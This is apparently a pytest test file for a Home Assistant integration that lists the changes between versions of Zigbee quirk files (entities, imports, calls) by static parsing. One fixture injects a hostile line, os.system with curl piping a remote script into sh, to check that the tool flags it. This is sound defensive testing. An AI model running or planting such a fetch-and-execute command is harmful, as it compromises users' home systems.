"""What an update changes, as the change list shows it under the update (changes.py reads files with ast only)."""

from __future__ import annotations

import importlib
import json
from pathlib import Path

from homeassistant.core import HomeAssistant

from .conftest import REPOS, Zha, apply_list, issue_of, setup_entry, start_fix, write_repo
from .integration import PACKAGE, text
from .integration import plan as plans

changes = importlib.import_module(f"{PACKAGE}.changes")

FIXTURES = Path(__file__).parent / "fixtures"
# An older SONOFF TRV-ZBT file someone put into a quirks folder by hand. Below it the version that followed.
TRV_OLD = (FIXTURES / "z2m_sonoff_trv_zbt_9f74d049.py.txt").read_bytes()
TRV_NEW = (FIXTURES / "z2m_sonoff_trv_zbt_02bf5749.py.txt").read_bytes()
TRV_CHANGES = (
    "**Changes:**\n\n"
    # The new version declares its first commands (the pairing buttons send them).
    "- New function calls: ZCLCommandDef\n"
    "- New: Temperature sensor (select)\n"
    "- New: Bluetooth pairing (start) (button)\n"
    "- New: Bluetooth pairing (stop) (button)\n\n"
)

HEAD = '''"""Acme A: a device.

Generated from the Zigbee2MQTT definition{source}.
Status: generated, not verified on hardware.
"""

from zhaquirks.tuya.builder import TuyaQuirkBuilder


class Mode(t.enum8):
    """mode values (z2m)."""

    eco = 0x00
    comfort = 0x01
{extra_member}

class AcmeCluster(CustomCluster):
    cluster_id = 0xFC00

    class AttributeDefs(BaseAttributeDefs):
        level = ZCLAttributeDef(id=0x0001, type=t.uint8_t)
        mode = ZCLAttributeDef(id=0x0002, type=t.enum8)


(
    TuyaQuirkBuilder("_TZE200_aaaa", "TS0601")
    .number(attribute_name=AcmeCluster.AttributeDefs.level.name, cluster_id=AcmeCluster.cluster_id, min_value=0, max_value={max_value}, step=1, unit={unit!r}, translation_key="level", fallback_name="Level")
    .enum(attribute_name=AcmeCluster.AttributeDefs.mode.name, cluster_id=AcmeCluster.cluster_id, enum_class=Mode, entity_platform=EntityPlatform.{platform}, translation_key="mode", fallback_name="Mode")
{child_lock}    .tuya_temperature(dp_id=2, scale={scale})
{mapping}    .device_automation_triggers({{{triggers}}})
    .add_to_registry()
)
'''
CHILD_LOCK = '    .tuya_switch(dp_id=1, attribute_name="child_lock", translation_key="child_lock", fallback_name="Child lock")\n'
SINGLE = '(COMMAND_SINGLE, BUTTON_1): {COMMAND: "1_single"}'
DOUBLE = '(COMMAND_DOUBLE, BUTTON_1): {COMMAND: "1_double"}'


def quirk(**changes_: object) -> bytes:
    values = {
        "source": "",
        "extra_member": "",
        "max_value": 10,
        "unit": "°C",
        "platform": "SELECT",
        "child_lock": CHILD_LOCK,
        "scale": 10,
        "mapping": "",
        "triggers": SINGLE,
    } | changes_
    return HEAD.format(**values).encode()


def items(old: bytes, new: bytes) -> list[str]:
    return changes.summarize(old, new).items()


def test_older_trv_copy_lists_the_three_new_entities():
    summary = changes.summarize(TRV_OLD, TRV_NEW)
    assert [f"{e.name} ({e.kind})" for e in summary.new] == ["Temperature sensor (select)", "Bluetooth pairing (start) (button)", "Bluetooth pairing (stop) (button)"]
    assert not (summary.removed or summary.changed or summary.events_added or summary.events_removed)
    assert changes.render(summary) == TRV_CHANGES


def test_removed_changed_and_button_events():
    old = quirk()
    new = quirk(child_lock="", max_value=20, unit="%", extra_member="    boost = 0x02\n", scale=100, triggers=f"{SINGLE}, {DOUBLE}")
    assert items(old, new) == [
        "Removed: Child lock (switch)",
        "Changed: Level (number): range, unit",
        "Changed: Mode (select): options",
        "Changed: Temperature (sensor): scale",
        "New button events: button 1: double",
    ]
    assert items(new, old)[-1] == "Removed button events: button 1: double"


def test_a_changed_platform_is_a_new_entity_in_home_assistant():
    """Another platform is a new entity with other abilities (an automation that switches something cannot
    use a sensor): Removed and New, also when it reads the same attribute."""
    assert items(quirk(), quirk(platform="SENSOR")) == ["New: Mode (sensor)", "Removed: Mode (select)"]
    assert items(zcl(), zcl(call="number")) == ["New: Level (number)", "Removed: Level (sensor)"]
    assert items(zcl(call="switch"), zcl(call="binary_sensor", name="lock")) == ["New: Level (binary sensor)", "Removed: Level (switch)"]


ZCL = """\"\"\"Acme Z: a device.

Status: generated, not verified on hardware.
\"\"\"

from zigpy.zcl.foundation import BaseAttributeDefs, ZCLAttributeDef
from zhaquirks.builder import EntityPlatform, QuirkBuilder
from zhaquirks.clusters import CustomCluster


class AcmeCluster(CustomCluster):
    cluster_id = 0xFC00

    class AttributeDefs(BaseAttributeDefs):
        {name} = ZCLAttributeDef(id={attr_id}, type=t.uint8_t)
        other = ZCLAttributeDef(id=0x0002, type=t.uint8_t)


class DerivedCluster(AcmeCluster):
    \"\"\"Takes cluster_id and the attributes from AcmeCluster.\"\"\"


class ExtendedCluster(AcmeCluster):
    class AttributeDefs(AcmeCluster.AttributeDefs):
        extra = ZCLAttributeDef(id=0x0005, type=t.uint8_t)


class BorrowingCluster(CustomCluster):
    \"\"\"Its own cluster id, the attributes of AcmeCluster (the file does not define CustomCluster).\"\"\"

    cluster_id = 0xFC00

    class AttributeDefs(AcmeCluster.AttributeDefs):
        extra = ZCLAttributeDef(id=0x0005, type=t.uint8_t)


(
    QuirkBuilder("Acme", "Z")
    .replaces(AcmeCluster)
    .{call}(attribute_name={cluster}.AttributeDefs.{name}.name, cluster_id={cluster}.cluster_id{extra}, translation_key="level", fallback_name="{fallback}")
    .add_to_registry()
)
"""


def zcl(**changes_: object) -> bytes:
    values = {"name": "level", "attr_id": "0x0001", "call": "sensor", "cluster": "AcmeCluster", "extra": "", "fallback": "Level"} | changes_
    return ZCL.format(**values).encode()


def test_an_entity_that_reads_the_same_attribute_under_another_key_gets_a_new_id():
    """Home Assistant keys a quirk entity by platform, endpoint and unique id suffix (or attribute name):
    another key is a new entity, also when it reads the same attribute (cluster and attribute id)."""
    note = "automations that use it need updating"
    # The attribute renamed, its id kept.
    assert items(zcl(), zcl(name="smoke_level")) == [f"New ID: Level (sensor): {note}"]
    assert items(zcl(), zcl(name="smoke_level", fallback="Smoke level")) == [f"New ID: Smoke level (sensor, was Level): {note}"]
    # Another unique id suffix.
    assert items(zcl(extra=', unique_id_suffix="level"'), zcl(extra=', unique_id_suffix="level_2"')) == [f"New ID: Level (sensor): {note}"]
    # Cluster id and attributes through the bases the file defines.
    assert items(zcl(cluster="DerivedCluster"), zcl(cluster="DerivedCluster", name="smoke_level")) == [f"New ID: Level (sensor): {note}"]
    assert items(zcl(cluster="ExtendedCluster"), zcl(cluster="ExtendedCluster", name="smoke_level")) == [f"New ID: Level (sensor): {note}"]
    assert items(zcl(cluster="BorrowingCluster"), zcl(cluster="BorrowingCluster", name="smoke_level")) == [f"New ID: Level (sensor): {note}"]
    # A Tuya datapoint under another attribute name.
    renamed = CHILD_LOCK.replace('attribute_name="child_lock"', 'attribute_name="lock"')
    assert items(quirk(), quirk(child_lock=renamed)) == [f"New ID: Child lock (switch): {note}"]


def test_another_attribute_or_an_unknown_cluster_stays_removed_and_new():
    # Another attribute id: a different entity.
    assert items(zcl(), zcl(name="smoke_level", attr_id="0x0003")) == ["New: Level (sensor)", "Removed: Level (sensor)"]
    # A cluster the file does not define (a standard cluster of zigpy): what it reads is not known.
    old, new = zcl(cluster="Thermostat"), zcl(cluster="Thermostat", name="smoke_level")
    assert items(old, new) == ["New: Level (sensor)", "Removed: Level (sensor)"]
    # Two removed entities of one platform that read the same attribute: which one carries on is not known.
    two = zcl().replace(b"    .add_to_registry()", b'    .sensor(attribute_name=AcmeCluster.AttributeDefs.level.name, cluster_id=AcmeCluster.cluster_id, unique_id_suffix="level_raw", fallback_name="Level raw")\n    .add_to_registry()')
    renamed = two.replace(b"AttributeDefs.level.name", b"AttributeDefs.smoke_level.name").replace(b"        level = ", b"        smoke_level = ").replace(b'"level_raw"', b'"level_raw_2"')
    summary = changes.summarize(two, renamed)
    assert summary.new_id == [] and len(summary.new) == 2 and len(summary.removed) == 2
    # On two platforms each one is known: a sensor and a number of the same attribute.
    two = zcl().replace(b"    .add_to_registry()", b'    .number(attribute_name=AcmeCluster.AttributeDefs.level.name, cluster_id=AcmeCluster.cluster_id, fallback_name="Level setting")\n    .add_to_registry()')
    renamed = two.replace(b"AttributeDefs.level.name", b"AttributeDefs.smoke_level.name").replace(b"        level = ", b"        smoke_level = ")
    assert items(two, renamed) == ["New ID: Level (sensor): automations that use it need updating", "New ID: Level setting (number): automations that use it need updating"]


def test_new_ids_follow_the_removed_entities_and_are_in_the_diagnostics():
    old = zcl().replace(b"    .add_to_registry()", b'    .switch(attribute_name=AcmeCluster.AttributeDefs.other.name, cluster_id=AcmeCluster.cluster_id, fallback_name="Other")\n    .add_to_registry()')
    new = zcl(name="smoke_level", fallback="Smoke level")
    summary = changes.summarize(old, new)
    assert summary.items() == ["Removed: Other (switch)", "New ID: Smoke level (sensor, was Level): automations that use it need updating"]
    assert summary.as_dict()["new_id"] == ["Smoke level (sensor, was Level)"]
    assert summary.as_dict()["removed"] == ["Other (switch)"] and summary.as_dict()["new"] == []
    # Names stay plain text in markdown.
    assert items(zcl(), zcl(name="smoke_level", fallback="Smoke *level*"))[0].startswith(r"New ID: Smoke \*level\* (sensor, was Level)")


def test_a_new_id_shows_the_other_changes_it_brings():
    """A rename that also changes the range, the unit or the scale must not read as the same entity
    under a new key only."""
    old = zcl(call="number", extra=', min_value=0, max_value=10, unit="%"')
    new = zcl(call="number", name="smoke_level", extra=', min_value=0, max_value=100, unit="s", multiplier=0.1')
    summary = changes.summarize(old, new)
    assert summary.items() == ["New ID: Level (number), also changed: range, scale, unit: automations that use it need updating"]
    assert summary.as_dict()["new_id"] == ["Level (number), also changed: range, scale, unit"]
    assert summary.changed == [] and summary.new == [] and summary.removed == []


def _with(base: bytes, call: str) -> bytes:
    """The ZCL fixture with one more entity call."""
    return base.replace(b"    .add_to_registry()", f"    .{call}\n    .add_to_registry()".encode())


def test_what_an_entity_reads_includes_endpoint_written_value_and_command():
    """Only the same endpoint, written value or command is the same feature; one removed entity against
    two new ones that read the same thing stays Removed and New."""
    note = "automations that use it need updating"
    # Another endpoint: another entity of the device.
    assert items(zcl(), zcl(name="smoke_level", extra=", endpoint_id=2")) == ["New: Level (sensor)", "Removed: Level (sensor)"]
    renamed = CHILD_LOCK.replace('attribute_name="child_lock"', 'attribute_name="lock", endpoint_id=2')
    assert items(quirk(), quirk(child_lock=renamed)) == ["New: Child lock (switch)", "Removed: Child lock (switch)"]
    # A write button: the value it writes is part of what it does.
    button = 'write_attr_button(attribute_name=AcmeCluster.AttributeDefs.other.name, attribute_value={value}, cluster_id=AcmeCluster.cluster_id, unique_id_suffix="{suffix}", fallback_name="Boost")'
    old = _with(zcl(), button.format(value=1, suffix="boost"))
    assert items(old, _with(zcl(), button.format(value=1, suffix="boost_mode"))) == [f"New ID: Boost (button): {note}"]
    assert items(old, _with(zcl(), button.format(value=2, suffix="boost_mode"))) == ["New: Boost (button)", "Removed: Boost (button)"]
    # A command button: the command it sends.
    command = 'command_button(command_name="{command}", cluster_id=AcmeCluster.cluster_id, unique_id_suffix="{suffix}", fallback_name="Reset")'
    old = _with(zcl(), command.format(command="reset_energy", suffix="reset"))
    assert items(old, _with(zcl(), command.format(command="reset_energy", suffix="reset_2"))) == [f"New ID: Reset (button): {note}"]
    assert items(old, _with(zcl(), command.format(command="reset_total", suffix="reset_2"))) == ["New: Reset (button)", "Removed: Reset (button)"]
    # One removed entity, two new ones on its attribute: which one carries on is not known.
    second = 'number(attribute_name=AcmeCluster.AttributeDefs.smoke_level.name, cluster_id=AcmeCluster.cluster_id, unique_id_suffix="level_2", fallback_name="Level setting")'
    summary = changes.summarize(zcl(), _with(zcl(name="smoke_level"), second.replace("number(", "sensor(")))
    assert summary.new_id == [] and len(summary.new) == 2 and len(summary.removed) == 1


def test_added_clusters_are_the_entities_zha_makes_of_them():
    battery = b"\n\nclass StructPowerConfiguration(XiaomiPowerConfiguration):\n    MIN_VOLTS_MV = 2850\n"
    new = quirk(mapping="    .adds(DeviceTemperatureCluster)\n    .adds(StructPowerConfiguration)\n") + battery
    assert items(quirk(), new) == ["New: Device temperature (sensor)", "New: Battery (sensor)"]


def test_other_code_is_never_called_harmless():
    new = quirk(mapping='    .tuya_dp(dp_id=9, ep_attribute="acme", attribute_name="hidden")\n')
    summary = changes.summarize(quirk(), new)
    assert summary.internal and not summary.cosmetic
    assert summary.items() == ["No entity added, removed or changed: other code differs"]


def test_new_imports_and_calls_are_named_first():
    new = quirk() + b'\nimport os\nfrom subprocess import run as _r\nos.system("curl -s https://example.invalid/x | sh")\n\n\ndef _helper():\n    return __import__("socket")\n'
    new = new.replace(b"max_value=10", b"max_value=20")
    assert items(quirk(), new) == [
        "New imports: os, subprocess",
        r"New function calls: \_\_import\_\_, os.system",
        "Changed: Level (number): range",
    ]
    # Everything a file calls besides its QuirkBuilder methods counts, in classes and functions too.
    summary = changes.summarize(quirk(), new)
    assert summary.as_dict()["imports_added"] == ["os", "subprocess"]
    assert summary.as_dict()["calls_added"] == ["__import__", "os.system"]
    # Nothing new: nothing named.
    assert changes.summarize(new, new).items() == []


def test_comments_and_header_only():
    # A file from before the versions left the header, then comment changes.
    old = quirk(source=" (zigbee-herdsman-converters 26.123.0, zha-device-handlers 1d6598c)")
    new = quirk().replace(b'"""mode values (z2m)."""', b'"""mode values (Zigbee2MQTT)."""') + b"# a comment\n"
    assert items(old, new) == ["No functional change: only comments and the file header differ"]


def test_status_change_is_named():
    # A device test marked the file verified: only the Status line (and the Revision) differ.
    old = quirk()
    new = old.replace(b"Status: generated, not verified on hardware.", b"Status: verified on hardware.")
    assert items(old, new) == ["Status now: verified on hardware.", "No functional change: only comments and the file header differ"]
    assert changes.summarize(old, new).as_dict()["status"] == "verified on hardware."
    assert changes.summarize(old, old.replace(b"# x", b"# y")).as_dict()["status"] is None


def test_identical_files_have_nothing_to_say():
    assert changes.render(changes.summarize(quirk(), quirk())) == ""


def test_unreadable_file_gives_no_list():
    assert changes.summarize(b"def broken(:\n", quirk()) is None
    assert changes.summarize(quirk(), b"\xff\xfe") is None
    assert changes.render(None) == ""


def test_long_lists_stop_after_ten_entries():
    calls = "".join(f'    .tuya_switch(dp_id={dp}, attribute_name="s{dp}", fallback_name="S{dp}")\n' for dp in range(100, 115))
    text = changes.render(changes.summarize(quirk(), quirk(mapping=calls)))
    bullets = [line for line in text.splitlines() if line.startswith("- ")]
    assert len(bullets) == 11
    assert bullets[-1] == "- and 5 more (all of them in the diagnostics)"


def test_the_change_list_shows_ten_entity_changes_of_an_update_at_most():
    calls = "".join(f'    .tuya_switch(dp_id={dp}, attribute_name="s{dp}", fallback_name="S{dp}")\n' for dp in range(100, 115))
    update = plans.Update("/config/custom_zha_quirks/z2m_acme_a.py", sha256="b" * 64, before="a" * 64, revision="0badc0de", withdrawn=False, devices=("radar",))
    devices = {"radar": plans.Device("_TZE200_aaaa", "TS0601", "Radar", "z2m_acme_a")}

    def shown(summary: changes.Summary | None) -> list[str]:
        return text.change_list(plans.Plan(update=[update]), devices, lambda name: "Acme A", {}, {update.path: summary}).splitlines()

    lines = shown(changes.summarize(quirk(), quirk(mapping=calls)))
    assert lines[0] == "- **Update** `z2m_acme_a.py` (Acme A) for Radar."
    assert lines[1:] == [f"    - New: S{dp} (switch)" for dp in range(100, 110)] + ["    - and 5 more (all of them in the diagnostics)"]
    # A file that cannot be read (or a download that failed): the update without its changes.
    assert shown(None) == lines[:1]


def test_names_are_plain_text_in_markdown():
    new = quirk(mapping='    .tuya_switch(dp_id=7, attribute_name="x", fallback_name="Power *boost* [1]")\n')
    assert items(quirk(), new) == [r"New: Power \*boost\* \[1\] (switch)"]


def test_the_code_is_never_run(tmp_path: Path):
    marker = tmp_path / "ran"
    new = quirk(mapping=f'    .tuya_switch(dp_id=7, attribute_name=__import__("pathlib").Path({str(marker)!r}).touch(), fallback_name="X")\n')
    assert items(quirk(), new) == [r"New function calls: (...).Path, (...).touch, \_\_import\_\_", "New: X (switch)"]
    assert not marker.exists()


IEEE = "00:11:22:33:44:55:66:0a"
IEEE_A = "00:11:22:33:44:55:66:01"
TRV_MANIFEST = {
    "sonoff_trv_zbt": {
        "file": "quirks/z2m_sonoff_trv_zbt.py",
        # As the manifest holds it: the file's FINGERPRINTS (a model-only wildcard).
        "fingerprints": [[None, "TRV-ZBT"]],
        "claimed_elsewhere": [],
        "vendor": "SONOFF",
        "model": "TRV-ZBT",
        "status": "generated",
        "path": "zcl",
        "risk": "medium",
        "risk_why": ["number_settings"],
        # The file's ENDPOINTS (its runtime check).
        "endpoints": {"1": [0xFC11]},
    }
}


def write_trv(repo_dir: Path, quirk_file: bytes) -> None:
    """The working tree ships this version of the TRV-ZBT file only."""
    (repo_dir / "quirks").mkdir(parents=True, exist_ok=True)
    (repo_dir / "manifest.json").write_text(json.dumps(TRV_MANIFEST))
    (repo_dir / "quirks" / "z2m_sonoff_trv_zbt.py").write_bytes(quirk_file)


async def test_the_change_list_shows_what_an_update_brings(hass: HomeAssistant, zha: Zha, repo_dir: Path, quirks_dir: Path):
    """The older TRV-ZBT file installed through the list, then the version that followed is out."""
    write_trv(repo_dir, TRV_OLD)
    zha.add_device(IEEE, "SONOFF", "TRV-ZBT", "Radiator")
    entry = await setup_entry(hass, repo_dir)
    await apply_list(hass)
    assert (quirks_dir / "z2m_sonoff_trv_zbt.py").read_bytes() == TRV_OLD
    zha.reload({IEEE: "z2m_sonoff_trv_zbt:SonoffTrvZbt"})
    write_trv(repo_dir, TRV_NEW)
    REPOS[repo_dir].publish()
    await entry.runtime_data.async_check()
    flow = await start_fix(hass, issue_of(hass, "changes"))
    lines = flow["description_placeholders"]["changes"].splitlines()
    assert lines[0].startswith("- **Update** `z2m_sonoff_trv_zbt.py` (SONOFF TRV-ZBT) for Radiator.")
    # Under the update the entities it brings, as TRV_CHANGES lists them for a dialog of its own.
    assert lines[1:5] == [
        "    - New function calls: ZCLCommandDef",
        "    - New: Temperature sensor (select)",
        "    - New: Bluetooth pairing (start) (button)",
        "    - New: Bluetooth pairing (stop) (button)",
    ]
    diagnostics = await entry.runtime_data.async_diagnostics()
    assert diagnostics["offered_changes"]["z2m_sonoff_trv_zbt.py"]["new"] == [
        "Temperature sensor (select)",
        "Bluetooth pairing (start) (button)",
        "Bluetooth pairing (stop) (button)",
    ]


async def test_the_change_list_says_when_an_update_only_changes_comments(hass: HomeAssistant, zha: Zha, repo_dir: Path):
    zha.add_device(IEEE_A, "_TZE200_aaaa", "TS0601", "Radar")
    entry = await setup_entry(hass, repo_dir)
    await apply_list(hass)
    zha.reload({IEEE_A: "z2m_tuya_a:TuyaA"})
    # Version 2 of the test files differs in a comment line only.
    write_repo(repo_dir, version=2)
    REPOS[repo_dir].publish()
    await entry.runtime_data.async_check()
    flow = await start_fix(hass, issue_of(hass, "changes"))
    lines = flow["description_placeholders"]["changes"].splitlines()
    assert lines[0].startswith("- **Update** `z2m_tuya_a.py` (Tuya A) for Radar.")
    assert lines[1] == "    - No functional change: only comments and the file header differ"
